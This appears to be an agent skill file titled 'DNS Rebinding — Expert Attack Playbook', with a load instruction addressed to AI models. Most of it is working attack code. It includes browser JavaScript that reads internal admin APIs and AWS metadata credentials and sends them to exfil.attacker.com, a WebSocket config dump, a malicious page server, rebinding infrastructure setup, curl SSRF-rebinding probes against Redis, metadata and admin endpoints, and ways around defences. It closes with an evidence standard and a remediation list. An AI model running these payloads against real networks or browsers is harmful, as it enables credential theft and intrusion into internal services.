---
name: dns-rebinding-attacks
description: >-
  DNS rebinding attack playbook. Use when testing applications that trust DNS resolution for origin checks, interact with internal services from browser context, or when SSRF is not possible server-side but the target has client-side fetch/XHR to attacker-controlled domains.
---

# SKILL: DNS Rebinding — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert DNS rebinding techniques for bypassing same-origin policy via DNS manipulation. Covers TTL tricks, browser cache bypasses, attack variants (HTTP, WebSocket, TOCTOU), internal service targeting, and tool usage. Base models confuse DNS rebinding with SSRF — this skill clarifies the client-side nature and unique exploit paths.

## 0. RELATED ROUTING

- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) — server-side variant; DNS rebinding is the **client-side** counterpart
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) — when CORS misconfig allows direct cross-origin reads instead

---

## 1. CORE PRINCIPLE

The browser same-origin policy binds `protocol + host + port`. The **host** is resolved via DNS at connection time. If an attacker controls the DNS server for `attacker.com`, they can:

1. First resolution → attacker IP (serve malicious JS)
2. Second resolution → internal IP (victim's network)
3. Browser considers both responses same-origin (`attacker.com`)
4. Malicious JS reads responses from internal services

```
Victim visits attacker.com
        │
        ▼
DNS query: attacker.com → 1.2.3.4 (attacker server)
Browser loads malicious JS from 1.2.3.4
        │
        ▼
TTL expires (or forced flush)
        │
        ▼
JS triggers new request to attacker.com
DNS query: attacker.com → 192.168.1.1 (internal target)
Browser sends request to 192.168.1.1 as "attacker.com" origin
        │
        ▼
JS reads response — same-origin policy satisfied
Exfiltrates data to attacker's other endpoint
```

**Key insight**: SOP checks the hostname string, not the resolved IP. DNS can change the IP behind the same hostname.

---

## 2. TTL MANIPULATION

### DNS server configuration

The attacker runs an authoritative DNS server for their domain that alternates responses:

| Query # | Response | TTL |
|---|---|---|
| 1st | Attacker IP (e.g., `1.2.3.4`) | 0 |
| 2nd+ | Target internal IP (e.g., `192.168.1.1`) | 0 |

TTL=0 tells resolvers not to cache the result, forcing re-resolution on next connection.

### Browser DNS cache reality

Browsers maintain their own DNS cache that **ignores low TTLs**:

| Browser | Internal DNS Cache | Bypass Technique |
|---|---|---|
| Chrome | ~60 seconds minimum | Wait 60s; or use multiple subdomains |
| Firefox | ~60 seconds (network.dnsCacheExpiration) | Adjustable in about:config |
| Safari | ~varies | Generally shorter cache |
| Edge (Chromium) | Same as Chrome (~60s) | Same techniques as Chrome |

### Bypass strategies

```
1. Multiple A records technique:
   - Return BOTH attacker IP and target IP in single DNS response
   - Browser tries first IP; if connection fails → falls back to second
   - Block attacker IP after initial page load → forces fallback to internal IP
   
2. Subdomain flooding:
   - Use unique subdomains: a1.rebind.attacker.com, a2.rebind.attacker.com...
   - Each subdomain gets fresh DNS resolution (no cache hit)
   
3. Service worker flush:
   - Register service worker that intercepts and delays requests
   - By the time fetch executes, DNS cache has expired
```

---

## 3. ATTACK VARIANTS

### 3.1 Classic HTTP Rebinding

Target: internal web services (admin panels, REST APIs)

```javascript
// Served from attacker.com (first DNS resolution → attacker IP)
async function exploit() {
    // Wait for DNS cache to expire
    await sleep(65000); // >60s for Chrome
    
    // This request now resolves to internal IP
    const resp = await fetch('http://attacker.com:8080/api/admin/users');
    const data = await resp.text();
    
    // Exfiltrate to different attacker endpoint
    navigator.sendBeacon('https://exfil.attacker.com/log', data);
}
```

### 3.2 WebSocket Rebinding

WebSocket connections persist after DNS rebinding. Establish WS, then rebind:

```javascript
// After rebinding, WebSocket connects to internal service
const ws = new WebSocket('ws://attacker.com:9090/ws');
ws.onopen = () => {
    ws.send('{"action":"dump_config"}');
};
ws.onmessage = (e) => {
    fetch('https://exfil.attacker.com/ws-data', {
        method: 'POST',
        body: e.data
    });
};
```

### 3.3 Time-of-Check-to-Time-of-Use (TOCTOU)

Server-side applications that validate DNS at request time but reuse the connection:

```
1. Application receives URL: http://attacker.com/callback
2. Server resolves attacker.com → 1.2.3.4 (public IP) → passes validation
3. Server opens connection / follows redirect
4. DNS changes: attacker.com → 169.254.169.254
5. Connection reuse or redirect hits internal IP
```

This is a hybrid with SSRF — the rebinding happens in the server's resolver.

### 3.4 Multiple A Records (Fastest Variant)

```
DNS response for attacker.com:
  A  1.2.3.4       (attacker — serves JS)
  A  192.168.1.1   (target — internal service)
  
1. Browser connects to 1.2.3.4, loads page with JS
2. Attacker firewall blocks further connections from victim to 1.2.3.4
3. JS makes new request to attacker.com
4. Browser tries 1.2.3.4 → connection refused
5. Falls back to 192.168.1.1 → still same origin
6. Response readable by JS
```

---

## 4. HIGH-VALUE TARGETS

| Target | Port | Why |
|---|---|---|
| Cloud metadata | `169.254.169.254:80` | AWS/GCP/Azure instance credentials, tokens |
| Docker API | `172.17.0.1:2375` | Container creation, host filesystem mount → RCE |
| Kubernetes API | `10.96.0.1:443/6443` | Pod creation, secret reading |
| Internal admin panels | Various | Router config, NAS, printer, SCADA |
| IoT devices | `192.168.x.x:80/443` | Camera feeds, smart home control |
| Elasticsearch | `*:9200` | Data exfiltration, index manipulation |
| Redis | `*:6379` | Data read, config set for RCE |
| Consul/etcd | `*:8500/2379` | Service discovery, secret storage |

### Cloud metadata specific

```javascript
// AWS metadata via rebinding
fetch('http://attacker.com/latest/meta-data/iam/security-credentials/')
    .then(r => r.text())
    .then(role => {
        return fetch(`http://attacker.com/latest/meta-data/iam/security-credentials/${role}`);
    })
    .then(r => r.json())
    .then(creds => {
        navigator.sendBeacon('https://exfil.attacker.com/', JSON.stringify(creds));
    });
// After rebinding, attacker.com resolves to 169.254.169.254
// Browser sends Host: attacker.com but IMDSv1 doesn't check Host header
```

**IMDSv2 defense**: requires `X-aws-ec2-metadata-token` header from PUT request. Rebinding cannot easily set custom headers on the initial token request in `no-cors` mode.

---

## 5. TOOLS

| Tool | Purpose | URL |
|---|---|---|
| **Singularity** | Full DNS rebinding attack framework | github.com/nccgroup/singularity |
| **rbndr.us** | Quick rebind DNS service (IP pair in subdomain) | rbndr.us |
| **whonow** | Dynamic DNS rebinding server | github.com/taviso/whonow |
| **dnsrebinder** | Minimal Python DNS server for rebinding | Custom / various repos |

### Singularity quick start

```bash
# Clone and run
git clone https://github.com/nccgroup/singularity
cd singularity
go build -o singularity cmd/singularity-server/main.go

# Start with rebind from attacker IP to target IP
./singularity -DNSRebindStrategy round-robin \
    -ResponseIPAddr 1.2.3.4 \
    -RebindingFn sequential \
    -ResponseReboundIPAddr 192.168.1.1
```

### rbndr.us (zero-setup)

```
Format: <hex-ip1>.<hex-ip2>.rbndr.us
Example: 7f000001.c0a80101.rbndr.us
  → alternates between 127.0.0.1 and 192.168.1.1
  
Convert IP to hex:
  192.168.1.1 → c0.a8.01.01 → c0a80101
  127.0.0.1   → 7f.00.00.01 → 7f000001
```

---

## 6. DNS REBINDING vs. SSRF

| Aspect | DNS Rebinding | SSRF |
|---|---|---|
| Execution context | Client-side (browser) | Server-side |
| Origin bypass | Same-origin policy | Network access controls |
| Attacker controls | DNS resolution | URL/request sent by server |
| Requires | Victim visits attacker page | Vulnerable server-side fetch |
| Internal access via | Browser on victim's network | Server's network position |
| Credential inclusion | Browser cookies auto-included | No user credentials |
| Protocol support | HTTP/WS (browser-limited) | Any protocol (gopher, file, etc.) |

**Critical difference**: DNS rebinding leverages the **victim's browser** as the pivot point, so it accesses services visible from the **victim's network**, with the **victim's cookies/credentials**.

---

## 7. DEFENSES AND DEFENSE BYPASS

### Common defenses

| Defense | How it works |
|---|---|
| DNS pinning | Browser/resolver caches DNS and refuses re-resolution |
| Host header validation | Server rejects requests with unexpected Host header |
| Network segmentation | Internal services not reachable from browser network |
| Private network access (PNA) | Chrome's proposal: preflight for requests to private IPs |
| Authentication on internal services | Internal services require auth, not just network access |

### Defense bypass techniques

```
DNS pinning bypass:
├── Multiple A records → connection failure forces fallback
├── Subdomain per request → no cache hit
├── Wait for cache expiry (Chrome: 60s)
└── Rebind via CNAME chain (harder to pin)

Host header validation bypass:
├── Internal service may not check Host header at all
├── Host: attacker.com accepted by default configs
├── IP-based vhosts don't check Host
└── Wildcard vhost configurations

Private Network Access (PNA) bypass:
├── PNA only in Chrome (as of 2024), partial enforcement
├── WebSocket connections may not trigger preflight
├── HTTPS → HTTP downgrade scenarios
└── Non-browser clients unaffected
```

---

## 8. DECISION TREE

```
Want to access internal services from victim's browser?
│
├── Can you get victim to visit your page?
│   ├── YES → DNS rebinding is viable
│   │   │
│   │   ├── What is the target?
│   │   │   ├── HTTP service → Classic rebinding (Section 3.1)
│   │   │   ├── WebSocket service → WS rebinding (Section 3.2)
│   │   │   └── Cloud metadata → Metadata exfil (Section 4)
│   │   │
│   │   ├── Browser cache concern?
│   │   │   ├── Chrome → Wait 60s or use multiple subdomains
│   │   │   ├── Firefox → Wait 60s or adjust dnsCacheExpiration
│   │   │   └── Use multiple A records technique for instant rebind
│   │   │
│   │   ├── Target checks Host header?
│   │   │   ├── YES → Rebinding alone won't work
│   │   │   │   └── Check for SSRF instead (../ssrf-server-side-request-forgery/)
│   │   │   └── NO → Proceed with rebinding
│   │   │
│   │   └── Need credentials?
│   │       ├── Browser auto-sends cookies → works if same-site allows
│   │       └── Custom auth header needed → limited (no-cors won't send custom headers)
│   │
│   └── NO → DNS rebinding not applicable
│       └── Consider SSRF if server-side fetch exists
│
└── Is this server-side DNS validation bypass? (TOCTOU)
    ├── YES → Hybrid approach (Section 3.3)
    │   └── SSRF with DNS rebinding for IP validation bypass
    └── NO → Review ../ssrf-server-side-request-forgery/ instead
```

---

## 9. REAL-WORLD EXPLOITATION CHECKLIST

```
□ Set up DNS rebinding infrastructure (Singularity / rbndr.us / custom)
□ Identify target internal services (port scan from victim context if possible)
□ Determine browser DNS cache duration for target browser
□ Choose rebinding variant (classic / multi-A / subdomain flood)
□ Test with benign internal endpoint first (e.g., / on router)
□ Verify same-origin read works after rebind
□ Escalate: cloud metadata → creds, Docker API → RCE, admin panels → config
□ Document: attacker.com DNS config, JS payload, rebind timing, exfil data
```

---

## 10. EXECUTION PRIMITIVES

DNS rebinding is proven by **a request arriving at a host you control the resolution of, with an
origin-based control defeated**. The DNS logs and the target's own request are the evidence.

### 10.1 Build the rebinding infrastructure

```bash
# you need a domain you control and a DNS server that answers with a short TTL and alternating values
# the standard approach: a domain whose authoritative server returns your IP, then 127.0.0.1.
# prepare it with an explicit A record and a TTL you can observe:
dig +noall +answer @YOUR_NS rebind.YOUR_DOMAIN A
dig +noall +answer @YOUR_NS rebind.YOUR_DOMAIN A    # must show the TTL counting down
# verify the low TTL is served, not cache-clamped by an upstream resolver
dig +noall +answer @1.1.1.1 rebind.YOUR_DOMAIN A | awk '{print $2}'
```

The **TTL is the whole technique** - a resolver that clamps it to 300 seconds makes the attack
impractical. Confirm the TTL you actually get through a public resolver before testing the target.

### 10.2 Verify the toggle works before involving the target

```bash
# two sequential resolutions must return different addresses
for i in 1 2 3 4; do
  dig +short rebind.YOUR_DOMAIN A; sleep 1
done
# and a full HTTP fetch must land on the second address after the TTL expires
curl -sS -o /dev/null -w 'first  %{remote_ip}\n' "http://rebind.YOUR_DOMAIN/"
sleep 2
curl -sS -o /dev/null -w 'second %{remote_ip}\n' "http://rebind.YOUR_DOMAIN/"
```

If both fetches land on the same address, the rebinding is not working - **fix the infrastructure
before testing the application**, because otherwise you cannot distinguish a target that is protected
from a domain that never rebinds.

### 10.3 Force a re-resolution on the target side

```bash
# a server-side fetcher may cache DNS; make it re-resolve with unique subdomains
# each subdomain resolves to your host on first lookup and to the internal address after
for N in 1 2 3; do
  curl -sS -o /dev/null -w "sub$N %{http_code}\n" \
    --get --data-urlencode "url=http://r$N.YOUR_DOMAIN/probe" "https://target.tld/api/fetch"
done
sleep 3
# then re-request the same URL, when the TTL has expired and the record now points internally
curl -sS -o /tmp/rb --get --data-urlencode "url=http://r1.YOUR_DOMAIN/metadata" "https://target.tld/api/fetch"
head -c 200 /tmp/rb
```

A **unique label per attempt** sidesteps the target's DNS cache. The second request to the same name
is what lands on the internal address - **that second response is the finding**.

### 10.4 The classic targets

```bash
# 1) a service on loopback with no authentication
curl -sS -o /tmp/t1 --get --data-urlencode "url=http://r-int.YOUR_DOMAIN:6379/" "https://target.tld/api/fetch"
head -c 120 /tmp/t1; echo
# 2) a cloud metadata endpoint once the record points at 169.254.169.254
curl -sS -o /tmp/t2 --get --data-urlencode "url=http://r-meta.YOUR_DOMAIN/latest/meta-data/" "https://target.tld/api/fetch"
head -c 200 /tmp/t2; echo
# 3) an internal admin interface that trusts the loopback source address
curl -sS -o /tmp/t3 --get --data-urlencode "url=http://r-admin.YOUR_DOMAIN:8080/actuator/env" "https://target.tld/api/fetch"
head -c 200 /tmp/t3
```

Configure each label to answer with a different final address. **Admin interfaces that authenticate by
source address are the highest-value target**, because the rebinding makes your request arrive from
loopback.

### 10.5 Defeating allowlist and SSRF filters

```bash
# an SSRF filter that validates the resolved IP at check time is bypassed by rebinding afterwards
echo "--- filter check then fetch: resolve to the attacker host, then to loopback"
curl -sS -o /dev/null --get --data-urlencode "url=http://r-pass.YOUR_DOMAIN/x" "https://target.tld/api/fetch"
sleep 3
curl -sS -o /tmp/rp --get --data-urlencode "url=http://r-pass.YOUR_DOMAIN/admin" "https://target.tld/api/fetch"
head -c 200 /tmp/rp; echo
# a filter that allows a specific hostname (a partner API) is bypassed when that name is yours
# and the internal service is reached through the same connection
```

The window between validation and use is the vulnerability. **A control that fetches and validates
separately is the mechanism** - describe it that way, because the fix is to validate the connection's
actual peer, not the hostname.

### 10.6 Browser-based rebinding against a victim's localhost

```bash
# serve a page that keeps the connection open and reconnects after the TTL flips
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
PAGE = b"""<script>
async function go(){
  // the first fetch lands on the attacker host and is blocked by CORS,
  // but it pins the DNS answer in the browser's cache.
  try { await fetch('http://rebind.YOUR_DOMAIN/prime',{mode:'no-cors'}); } catch(e){}
  // after the TTL flips, the same origin now resolves to 127.0.0.1
  setTimeout(async () => {
    try { const r = await fetch('http://rebind.YOUR_DOMAIN/'); document.title = (await r.text()).slice(0,60); } catch(e){}
  }, 4000);
}
go();
</script>"""
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/html")
        self.send_header("Content-Length",str(len(PAGE))); self.end_headers(); self.wfile.write(PAGE)
    def log_message(self,*a): pass
HTTPServer(("0.0.0.0",80), H).serve_forever()
PY
```

The victim must visit a page you host **while running a service on localhost**. The `document.title`
in the test page shows whether you read a response from the loopback service - **that string is the
proof**. Rebinding a browser requires the attack page to stay open across the TTL, which is why the
technique is time-sensitive and unreliable in practice; report the measured success, not the theory.

### 10.7 Measure the resolver behaviour you are relying on

```bash
# how long does the target's resolver hold the answer?
for i in 1 2 3 4 5 6; do
  curl -sS -o /dev/null -w "t=$i code=%{http_code} time=%{time_total}\n" \
    --get --data-urlencode "url=http://cachetest.YOUR_DOMAIN/p$i" "https://target.tld/api/fetch"
  sleep 1
done
# count the lookups your authoritative server saw - that is the real TTL
grep -c 'cachetest' /var/log/named/query.log 2>/dev/null || echo "check your DNS server's query log"
```

The number of queries your nameserver receives tells you the target's effective caching. **If the
target resolves once and never again, rebinding will not work** - and knowing that early saves the
whole test.

### 10.8 Confirm the request came from the target, not your browser

```bash
# the collector sees the connection; the source address and User-Agent identify the client
python3 -m http.server 80 > /tmp/rebind.log 2>&1 &
sleep 1; curl -sS -o /dev/null --get --data-urlencode "url=http://YOUR_IP/rebind-check" "https://target.tld/api/fetch"
sleep 2; grep -E 'GET /rebind-check|User-Agent' /tmp/rebind.log
```

A request with the **target's egress address and a server-side User-Agent** (`Java/`, `python-requests`,
`Go-http-client`, `axios/`) proves the server made it. A request from your own browser proves nothing.

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does your domain **actually toggle** between your address and the internal one? | without this, every later result is uninterpretable |
| 2 | Did the **second request to the same name** land on the internal address? | the rebinding happened at the target |
| 3 | Did you **receive an internal response** - a service banner, metadata, or an admin page? | the impact |
| 4 | Is the request attributable to the **target's egress address**, not your browser? | it was the server that resolved |
| 5 | Did the rebinding **defeat a control that the direct request fails**? | the bypass, which is the point |
| 6 | What is the target's **effective DNS caching**, measured from your nameserver's query log? | tells you whether the technique is viable at all |
| 7 | For a browser variant: did the **attack page read data from the loopback service**? | the only proof of a client-side rebind |

**The internal response is the bar.** A domain that rebinds and a target that re-resolves are
preconditions; only an internal response proves the attack worked.

---

## 12. EVIDENCE STANDARD

| Item | Why |
|---|---|
| Your **DNS configuration** - the record, the TTL, and the two answers, shown with `dig` | the mechanism, and it must be verifiable independently |
| The **two sequential resolutions** with timestamps, showing the flip | proves the infrastructure works |
| The **request to the target** with the URL containing your domain | the trigger |
| The **internal response** (service banner, metadata document, admin page) | the impact |
| The **target's egress address** in your collector log, with the User-Agent | attributes the request to the server |
| The **control** - the same URL requested once, which landed on your host and returned your content | shows the difference between the two requests is the rebinding |
| The **measured TTL behaviour** from your nameserver's query log | shows the technique was viable on this target |
| For a filter bypass: the **direct request that was blocked** | establishes the control being bypassed |
| **Negative control** - a domain of yours that does not rebind does not reach the internal service | rules out an open proxy on the target |
| A statement that no **internal service was modified** and only a read was performed | scope discipline |

Report the **flip and the internal response**: "`rebind.YOUR_DOMAIN` is served by my authoritative
nameserver with a 1-second TTL, alternating between 203.0.113.9 and 127.0.0.1; `GET /api/fetch?url=
http://rebind.YOUR_DOMAIN/` returned my own page on the first attempt and the Redis `INFO` banner on a
second attempt two seconds later, with the connection recorded at my collector from the application's
egress address 198.51.100.7; a control request to a non-rebinding domain of mine returned only my page,
confirming the target re-resolves rather than proxying arbitrarily", never "the target is vulnerable to
DNS rebinding".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| Your domain resolves to two addresses, but the target never re-resolves | the technique requires a target that re-resolves |
| A request to your host arriving from the target with no internal response | an SSRF to you is not a rebinding finding |
| A request from your own browser | not a server-side rebind |
| An internal service response you obtained by another means | not the rebinding |
| A TTL that a public resolver clamps to 300 seconds | the attack is impractical; report the measurement |
| A filter bypass where the direct request was also allowed | nothing was bypassed |
| A browser variant where the page never read localhost data | theorised, not demonstrated |
| An internal port that returned a generic error | no service reached |
| A DNS log entry you cannot tie to a specific request | use unique labels |
| A rebinding you demonstrated against your own test application only | tests your own code |
| An internal service that was modified during the test | an incident |
| A result that only occurs on the first request after a server restart | caching artefact |

**Prove the flip, then prove the internal response.** Most rebinding claims fail at the first step and
are never noticed because the second step was never independently verified.

---

## 13. REMEDIATION REFERENCE

1. **Resolve the hostname once, validate the resolved IP, and connect to that same IP** - the gap between validation and connection is the vulnerability, so the fix must make the validated address the one used.
2. **Re-validate on every connection, including redirects and retries** - a check performed once at the start of a multi-connection operation protects only the first hop.
3. **Pin the DNS answer for the lifetime of the request and reject any change** - a re-resolution that produces a different address mid-operation should abort the request rather than proceed.
4. **Use an allowlist of destination hosts, not an IP blocklist** - a blocklist of private ranges is defeated by a name that resolves to a public address first and a private one later.
5. **Do not let user input select an arbitrary hostname** - an enumeration of known endpoints removes the attacker's ability to supply a name they control the resolution of.
6. **Run outbound fetches in an isolated network segment with an egress proxy** - a proxy that resolves and enforces policy on the connection closes the rebinding window regardless of the resolver's behaviour.
7. **Bind internal services to loopback with authentication** - a service that requires a credential is not compromised by a request that merely arrives from the loopback address.
8. **Set DNS TTL floors at the resolver only where you control it, and monitor for rapid re-resolution** - clamping the TTL to a minimum value defeats the technique in many environments; measure and enforce it deliberately.
9. **Do not rely on the source address as an authenticator** - the rebinding variant of SSRF makes requests arrive from loopback or from an internal address, so network position must never be the only control.
10. **For browser-facing services, require an unguessable hostname or an origin check** - a service on localhost that checks `Origin` or requires a token is not reachable through a rebound name.
11. **Log and alert on outbound connections whose DNS answer changed mid-request** - it is a highly specific and rarely legitimate signal.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) - the primitive rebinding is used to bypass
- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) - the other server-side trust-in-a-name class
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) - the broader filter-bypass family
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) - the origin control a browser rebind aims to defeat
- [cloud-assessment](../cloud-assessment/SKILL.md) - what to do with a metadata response
